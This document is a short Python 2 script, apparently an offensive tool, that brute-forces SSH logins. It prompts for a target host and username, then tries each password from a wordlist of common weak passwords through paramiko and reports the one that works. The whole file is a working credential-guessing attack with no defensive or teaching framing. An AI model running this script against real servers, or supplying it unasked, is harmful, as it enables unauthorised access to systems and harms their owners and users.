#!/usr/bin/env python
import sys, paramiko, os, socket

input_file = "/usr/share/wordlists/512-worst-passwords.txt"
paramiko.util.log_to_file("brute_log.txt")

def ssh_connect(password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		code = 1
	except socket.error, e:
		code = 2
	ssh.close()
	return code

def doWork():
	file = open(input_file, "r")
	for word in file.readlines():
		password = word.strip("\n")

		response = ssh_connect(password)
		if response == 0:
			print ("[*] Pass Found: %s" % (password))
			sys.exit()
		elif response == 1:
			print ("[*] Auth Failed: %s" % (password))
		elif response == 2:
			print "[*] Connection Failed"
			sys.exit()

if __name__ == "__main__":
	try:
		host = raw_input("[*] Enter Target Host Address: ")
		username = raw_input("[*] Enter SSH Username: ")

		if os.path.exists(input_file) == False:
			print "\n[*] File Path Does Not Exist!"
			sys.exit()

		else:
			doWork()
	except KeyboardInterrupt:
			print "\n\n[*] Exiting"
			sys.exit()

